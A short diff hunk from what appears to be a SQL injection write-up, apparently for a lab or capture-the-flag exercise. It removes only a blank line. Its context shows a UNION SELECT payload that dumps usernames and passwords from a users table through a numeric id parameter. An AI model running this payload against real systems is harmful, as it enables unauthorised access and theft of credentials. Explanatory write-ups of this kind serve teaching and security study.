@@ -9,5 +9,4 @@ more like ``` id = <integer> ``` so we dont need to use a single quote like in [
 The login dump can simply be retrieved by using
 ```
 UNION SELECT 1, group_concat(username,0x7c,password),3 FROM users 
-
 ```
